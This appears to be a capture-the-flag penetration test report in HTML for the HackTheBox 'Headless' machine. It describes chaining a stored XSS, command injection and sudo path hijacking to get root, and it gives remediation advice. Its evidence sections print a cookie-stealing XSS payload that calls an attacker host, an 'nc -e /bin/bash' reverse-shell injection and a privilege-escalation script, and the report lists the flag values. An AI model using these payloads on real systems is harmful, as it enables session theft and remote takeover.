@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - Headless</title>
+    <style>
+        /* --- Universal Styles for Screen and Print --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px;
+            background-color: #0c5975;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+        
+        /* This rule helps control the margins set by the browser's print function */
+        @page {
+            margin: 0.75in;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings: Headless</h2>
+        <h3 class="report-meta">Date: February 16, 2025</h3>
+        <h3 class="report-meta">Version: 1.0</h3>
+
+        <div class="confidential">
+            <strong>CONFIDENTIAL</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+        
+        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
+        <ol>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#technical-summary">Technical Summary</a></li>
+            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
+            <li><a href="#attack-timeline">Attack Timeline</a></li>
+            <li><a href="#port-scan">Port Scan Results</a></li>
+            <li><a href="#remediation">Remediation Recommendations</a></li>
+            <li><a href="#evidence">Evidence Files</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
+        <p>This report details the findings of a penetration test on the HTB Headless machine (10.10.11.8). The assessment uncovered a chain of critical vulnerabilities, beginning with a Cross-Site Scripting (XSS) flaw that was used to steal an administrator's session cookie. This session was then used to exploit a command injection vulnerability in an administrative dashboard, granting initial user-level access. Finally, a misconfigured `sudo` rule allowing a user to run a system check script was exploited via path hijacking, leading to full root privileges and a complete system compromise.</p>
+        
+        <h3>Key Findings Summary</h3>
+        <ul>
+            <li><strong>3 critical vulnerabilities</strong> identified and chained.</li>
+            <li><strong>Complete system compromise</strong> achieved from an unauthenticated position.</li>
+            <li><strong>Cross-Site Scripting (XSS)</strong> in the User-Agent header, leading to admin session hijacking.</li>
+            <li><strong>OS Command Injection</strong> in a dashboard report generation feature.</li>
+            <li><strong>Privilege Escalation</strong> via path hijacking of a script run with `sudo`.</li>
+        </ul>
+
+        <h3>Risk Level: CRITICAL</h3>
+        <p>The system exhibits a critical risk level. The combination of a public-facing XSS vulnerability with an authenticated command injection and a flawed `sudo` configuration provides a clear and repeatable path for an external attacker to gain full administrative control of the system.</p>
+
+        <hr>
+
+        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
+        
+        <h3>Target Information</h3>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.11.8</li>
+            <li><strong>Attacker IP:</strong> 10.10.14.18</li>
+            <li><strong>Operating System:</strong> Debian 12</li>
+            <li><strong>Hostname:</strong> headless</li>
+        </ul>
+
+        <h3>Attack Vector Summary</h3>
+        <ol>
+            <li><strong>Initial Access:</strong> A Cross-Site Scripting (XSS) vulnerability in the `User-Agent` header of the `/support` form was exploited to steal an administrator's session cookie. With this cookie, the administrative dashboard was accessed, where a command injection vulnerability in the `date` parameter of the report generation feature was used to gain a reverse shell as the user `dvir`.</li>
+            <li><strong>Privilege Escalation:</strong> The user `dvir` was found to have passwordless `sudo` access to run the `/usr/bin/syscheck` script. This script insecurely executes another script (`initdb.sh`) using a relative path. By creating a malicious `initdb.sh` in the `/tmp` directory and running the `syscheck` script from there, the malicious script was executed as root, granting a root shell.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>
+
+        <h3>Finding 1: Cross-Site Scripting via User-Agent Header</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.2<br>
+        <strong>CWE:</strong> CWE-79 (Improper Neutralization of Input During Web Page Generation - 'Cross-site Scripting')</p>
+        <p><strong>Description:</strong><br>
+        The `/support` page on the web application is vulnerable to a stored XSS attack. The backend appears to log or display support requests, including the full `User-Agent` HTTP header, to an administrator view without proper sanitization. An attacker can submit a support request with a malicious JavaScript payload in their `User-Agent` header. When an administrator views this request, the script executes in their browser.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Parameter:</strong> `User-Agent` HTTP header in a POST request to `/support`.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following payload was used in the `User-Agent` header to steal the administrator's cookie:</p>
+        <pre><code>&lt;script&gt;var i=new Image(); i.src="http://10.10.14.18:5000/?cookie="+btoa(document.cookie);&lt;/script&gt;</code></pre>
+        <p><strong>Impact:</strong> This vulnerability allows an attacker to steal an administrator's session cookie (`is_admin`), hijack their session, and gain unauthorized access to privileged sections of the web application.</p>
+
+        <h3>Finding 2: OS Command Injection in Admin Dashboard</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 9.1<br>
+        <strong>CWE:</strong> CWE-78 (Improper Neutralization of Special Elements used in an OS Command - 'OS Command Injection')</p>
+        <p><strong>Description:</strong><br>
+        After gaining access to the `/dashboard` via the hijacked session cookie, a feature for generating a "website health report" was found. This feature takes a `date` parameter that is passed directly to a back-end shell command without proper sanitization. An attacker can inject arbitrary OS commands by appending them to the date with a semicolon.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Parameter:</strong> `date` in a POST request to `/dashboard`.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following payload was used in the `date` parameter to gain a reverse shell:</p>
+        <pre><code>date=2023-09-14;nc -e /bin/bash 10.10.14.18 9000</code></pre>
+        <p><strong>Impact:</strong> Successful exploitation results in remote code execution on the server as the user `dvir`, providing the attacker with their initial shell access.</p>
+
+        <h3>Finding 3: Privilege Escalation via Sudo Path Hijacking</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 7.8<br>
+        <strong>CWE:</strong> CWE-427 (Uncontrolled Search Path Element)</p>
+        <p><strong>Description:</strong><br>
+        The user `dvir` has been granted `NOPASSWD` sudo access to execute the `/usr/bin/syscheck` script. This script is intended to check system status and restart a database service. However, when it attempts to start the service, it calls `./initdb.sh` using a relative path. Because the script does not change to a trusted directory first, it will execute whatever `initdb.sh` file is in the current working directory. An attacker can abuse this by creating their own malicious `initdb.sh` in `/tmp`, changing their directory to `/tmp`, and then executing `sudo /usr/bin/syscheck`.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Component:</strong> Sudoers rule for `/usr/bin/syscheck`.</li>
+            <li><strong>Flaw in Script:</strong> `syscheck` executes `./initdb.sh` instead of an absolute path like `/usr/local/bin/initdb.sh`.</li>
+        </ul>
+        <p><strong>Evidence:</strong><br>The following steps were taken to gain a root shell:</p>
+        <pre><code># Create malicious script in a world-writable directory
+echo -e '#!/bin/bash\n/bin/bash' > /tmp/initdb.sh
+chmod +x /tmp/initdb.sh
+
+# Change to that directory
+cd /tmp
+
+# Execute the sudo-privileged script, which now calls our malicious script
+sudo /usr/bin/syscheck</code></pre>
+        <p><strong>Impact:</strong> This vulnerability provides a direct and simple path for the `dvir` user to escalate their privileges to root, leading to a complete compromise of the system.</p>
+
+        <hr>
+
+        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
+        
+        <h3>Phase 1: Reconnaissance</h3>
+        <ul>
+            <li><strong>Scanning:</strong> Nmap scan identified SSH on port 22 and an HTTP service on port 5000.</li>
+            <li><strong>Web Enumeration:</strong> WhatWeb and Nuclei identified a Python/Werkzeug application and insecure cookie settings.</li>
+        </ul>
+
+        <h3>Phase 2: Initial Access</h3>
+        <ul>
+            <li><strong>XSS Exploitation:</strong> Submitted a support request with a malicious `User-Agent` header to steal a cookie.</li>
+            <li><strong>Session Hijack:</strong> Received the `is_admin` cookie on a listener and used it to access the `/dashboard`.</li>
+            <li><strong>Command Injection:</strong> Exploited the `date` parameter in the dashboard's report feature to gain a reverse shell as `dvir`.</li>
+        </ul>
+        
+        <h3>Phase 3: Privilege Escalation</h3>
+        <ul>
+            <li><strong>Sudo Enumeration:</strong> Ran `sudo -l` to discover the `NOPASSWD` rule for `/usr/bin/syscheck`.</li>
+            <li><strong>Script Analysis:</strong> Examined the `syscheck` script and identified the relative path execution of `initdb.sh`.</li>
+            <li><strong>Path Hijacking:</strong> Created a malicious `initdb.sh` in `/tmp`.</li>
+            <li><strong>Root Access:</strong> Changed directory to `/tmp` and executed `sudo /usr/bin/syscheck` to get a root shell.</li>
+        </ul>
+
+        <hr>
+        
+        <h2 id="port-scan">PORT SCAN RESULTS</h2>
+        <h3>TCP Port Scan</h3>
+        <pre><code>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
+|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
+|_http-title: Under Construction
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+        <hr>
+        
+        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
+        
+        <h3>CRITICAL PRIORITY</h3>
+        <ol>
+            <li><strong>Fix Sudo Path Hijacking:</strong> Modify the `/usr/bin/syscheck` script to use absolute paths for all commands it executes. Specifically, change the call from `./initdb.sh` to its full, correct path (e.g., `/usr/local/sbin/initdb.sh`). Ensure the target script and its directory are not writable by non-root users.</li>
+            <li><strong>Sanitize Command Injection Parameter:</strong> The `date` parameter in the dashboard must be strictly validated. It should only accept values in the expected `YYYY-MM-DD` format. Never concatenate user input directly into a command-line execution.</li>
+            <li><strong>Implement Output Encoding for XSS:</strong> Sanitize all data, including HTTP headers like `User-Agent`, before it is rendered on any web page. Applying context-aware output encoding is the most effective defense against XSS.</li>
+        </ol>
+
+        <h3>HIGH PRIORITY</h3>
+        <ol>
+            <li><strong>Enforce Secure Cookie Attributes:</strong> All session cookies, especially for administrators, must be set with the `Secure` and `HttpOnly` flags to prevent them from being transmitted over unencrypted channels or accessed by client-side scripts.</li>
+            <li><strong>Principle of Least Privilege:</strong> Review all `sudo` rules to ensure they are necessary and as specific as possible. Avoid granting broad permissions or permissions to scripts that can be easily manipulated.</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="evidence">EVIDENCE FILES</h2>
+        
+        <h3>User Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /home/dvir/user.txt</li>
+            <li><strong>Value:</strong> 56384c821f4a80442a67c34c62491d16</li>
+        </ul>
+
+        <h3>Root Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /root/root.txt</li>
+            <li><strong>Value:</strong> d0271566a699c887daefefd89a155e23</li>
+        </ul>
+
+        <h3>Key Artifacts</h3>
+        <ul>
+            <li><strong>XSS Payload:</strong> `User-Agent: <script>...btoa(document.cookie)...</script>`</li>
+            <li><strong>Command Injection Payload:</strong> `date=...;nc -e /bin/bash ...`</li>
+            <li><strong>Privilege Escalation Vector:</strong> Sudo rule for `/usr/bin/syscheck` combined with a malicious `/tmp/initdb.sh`.</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="conclusion">CONCLUSION</h2>
+        <p>The Headless machine was compromised through a series of classic, high-impact vulnerabilities. The attack path demonstrates how a seemingly minor flaw like XSS can be the starting point for a full system takeover when combined with other security weaknesses. The initial XSS allowed for session hijacking, which enabled the exploitation of a critical command injection bug. The final stage of the attack leveraged a poorly written script with excessive `sudo` privileges. This engagement underscores the importance of a layered security approach, including secure coding practices, input validation, and careful management of system permissions.</p>
+        
+        <p><strong>Business Risk:</strong> CRITICAL - An unauthenticated attacker can gain complete administrative control of the server. This could lead to total data loss, theft of sensitive information, service disruption, and the use of the server as a pivot point for further attacks into the network.</p>
+        <p><strong>Technical Risk:</strong> The combination of XSS, command injection, and a flawed sudo policy creates a reliable and straightforward path for an attacker to escalate privileges from zero access to root.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
+            <strong>Date:</strong> February 16, 2025</p>
+            <p>CONFIDENTIAL - For educational purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
